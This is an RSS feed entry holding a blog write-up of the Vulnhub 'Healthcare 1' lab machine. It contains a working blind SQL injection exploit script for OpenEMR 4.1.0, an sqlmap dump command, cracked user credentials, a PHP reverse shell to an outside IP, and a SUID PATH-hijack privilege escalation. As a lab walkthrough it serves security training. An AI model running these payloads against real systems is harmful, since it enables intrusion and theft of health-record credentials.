@@ -1,0 +1,525 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SUID on ikuamike</title>
+    <link>https://blog.ikuamike.io/tags/suid/</link>
+    <description>Recent content in SUID on ikuamike</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Michael Ikua</copyright>
+    <lastBuildDate>Sat, 03 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/suid/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnhub: Healthcare 1</title>
+      <link>https://blog.ikuamike.io/posts/2021/healthcare1/</link>
+      <pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/healthcare1/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Difficulty&lt;/th&gt;
+&lt;th&gt;Release Date&lt;/th&gt;
+&lt;th&gt;Author&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Intermediate&lt;/td&gt;
+&lt;td&gt;29 Jul 2020&lt;/td&gt;
+&lt;td&gt;v1n1v131r4&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;For this box, we perform directory bruteforce on the webserver to discover a vulnerable version of openemr. Openemr here
+is vulnerable to sql injection that we leverage to extract usernames and password hashes. After cracking the hashes, we use the
+discovered credentials to access the ftp server and upload a php reverse shell to the webserver. This serves as our initial
+entry. To escalate our privileges we abuse a suid binary that doesn&amp;rsquo;t use absolute path in commands it&amp;rsquo;s running,
+therefore we can hijack any of those commands and run any commands of our choosing as root.&lt;/p&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;Nmap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.106
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00023s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.3d
+80/tcp open  http    Apache httpd 2.2.17 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; disallowed entries
+| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/
+|_/all_our_e-mail_addresses /admin/ /
+|_http-server-header: Apache/2.2.17 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;PCLinuxOS 2011/PREFORK-1pclos2011&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Coming Soon &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+Service Info: OS: Unix
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;21-ftp&#34;&gt;21 (FTP)&lt;/h2&gt;
+&lt;p&gt;Anonymous access is not enabled and the server version isn&amp;rsquo;t vulnerable to any known vulnerabilities.
+We can look at this again when we have credentials.&lt;/p&gt;
+&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
+&lt;p&gt;Accessing this on the browser, we only get a static site with not much functionality.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;When we perform a directory bruteforce we get the following results:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ffuf -ic -c -u &#39;http://192.168.56.106/FUZZ&#39; -e / -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -fc 403 | tee -a healthcare1.ffuf
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After checking the directories we have discovered, openemr returns an application. From their website:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;OpenEMR is the most popular open source electronic health records and medical practice management solution.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;This version of openemr is outdated. Searching for available vulnerabilities and exploits for this version using searchsploit,
+we discover an sql injection vulnerability.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Unfortunately the PoC provided doesn&amp;rsquo;t work. I found a better one from packetstormsecurity:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://packetstormsecurity.com/files/108328/OpenEMR-4.1.0-SQL-Injection.html
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The PoC provided shows a blind sql injection. The below payload causes the request to delay for about 5 seconds.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&#39;%2b(SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)%2b&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using this, I was able to create a script to extract username and password hash of all existing users. Soon to be
+submitted to exploit-db.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Title: OpenEMR 4.1.0 - SQL Injection&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Date: 2021-04-03&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Author: Michael Ikua&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Vendor Homepage: https://www.open-emr.org/&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Version: 4.1.0&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   ____                   ________  _______     __ __   ___ ____
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  &amp;lt;  // __ &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    /_/
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ____  ___           __   _____ ____    __    _
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;)
+
+all &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;printable
+&lt;span style=&#34;color:#75715e&#34;&gt;# edit url to point to your openemr instance&lt;/span&gt;
+url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;extract_users_num&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Finding number of users...&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
+        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if((select count(username) from users)=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(n) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
+            user_length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Found number of users: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(user_length))
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; user_length
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;extract_users&lt;/span&gt;():
+    users &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; extract_users_num()
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Extracting username and password hash...&amp;#34;&lt;/span&gt;)
+    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;):
+        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if(length((select+group_concat(username,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,password)+from+users+limit+0,1))=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(n) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+        &lt;span style=&#34;color:#75715e&#34;&gt;#print(payload)&lt;/span&gt;
+        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
+        &lt;span style=&#34;color:#75715e&#34;&gt;#print(r.request.url)&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
+            length &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,length&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; all:
+            payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if(ascii(substr((select+group_concat(username,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,password)+from+users+limit+0,1),&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(i)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,1))=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(ord(char))&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+            &lt;span style=&#34;color:#75715e&#34;&gt;#print(payload)&lt;/span&gt;
+            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
+            &lt;span style=&#34;color:#75715e&#34;&gt;#print(r.request.url)&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
+                output&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(char)
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;:
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(char, end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, flush&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+    extract_users()
+&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Exiting...&amp;#34;&lt;/span&gt;)
+    sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running the script, we get the hashes of 2 users.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;pre&gt;&lt;code&gt;admin : 3863efef9ee2bfbc51ecdca359c6302bed1389e8
+medical : ab24aed5a7c4ad45615cd7e0da816eea39e4895d
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can try crack these hashes using hashcat/john the ripper but using crackstation.net would be quicker.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Now we have passwords for both users.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;admin : ackbar
+medical : medical
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;shell-as-apache&#34;&gt;Shell as apache&lt;/h1&gt;
+&lt;p&gt;With this credentials, let&amp;rsquo;s get back to ftp. Only the credentials for medical user work.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;On ftp we see that we have access to the file system as the medical user, and we can even access
+the web server directory.&lt;/p&gt;
+&lt;p&gt;Due to the permissions set we can only write to openemr directory. With this, we can upload a php file that will provide
+a reverse shell.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Contents of revshell.php:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Making a request to the uploaded file using curl, we get the reverse shell.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After spawning a proper tty shell with python, we can switch to the medical user. In the Documents folder there&amp;rsquo;s a
+Passwords.txt but the root creds don&amp;rsquo;t work.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
+&lt;p&gt;Checking for usual privesc techniques like suid binaries by using find command we get one unusual binary.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;find / -perm -4000 -ls 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After running healthcheck, it outputs some system information like disks.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;To understand what exactly it&amp;rsquo;s doing, we run strings on this binary. From this we identify ways to abuse this since
+it doesn&amp;rsquo;t use absolute paths on the commands it runs, therefore it will use what it finds from our PATH variable.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;I&amp;rsquo;ll use ifconfig here with my own code and place it in the /tmp folder and update my PATH variable. When this ifconfig
+is executed it will created a copy of the bash binary which has suid permissions.&lt;/p&gt;
+&lt;p&gt;Contents of ifconfig:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/sh
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp /bin/bash /tmp/suidbash;chmod u+s /tmp/suidbash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;We can then run the suidbash binary with -p to preserve the privileges and get root privileges and read the final
+root.txt.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After getting root I found I has skipped over user.txt in almirant&amp;rsquo;s home directory&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
+&lt;p&gt;After looking at other writeups, I discovered other possible paths for exploiting this
+machine.&lt;/p&gt;
+&lt;p&gt;Initial step needed was exploiting the sql injection. Using sqlmap would have been a quicker way
+and achieved the same results. I intentionally didn&amp;rsquo;t use sqlmap on my initial exploitation.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span&gt; --batch --dump -T users -C username,password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-25.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Using the obtained credentials, we can login to openemr as administrator and we can either upload a php file or
+edit existing php files for command execution.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;h4 id=&#34;file-upload&#34;&gt;File upload&lt;/h4&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;The file upload functionality does not have restrictions, therefore we can upload our php reverse shell and it will
+be stored in that images directory.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;We can the trigger the reverse shell by visiting the revshell.php in the /openemr/sites/default/images/ directory.&lt;/p&gt;
+
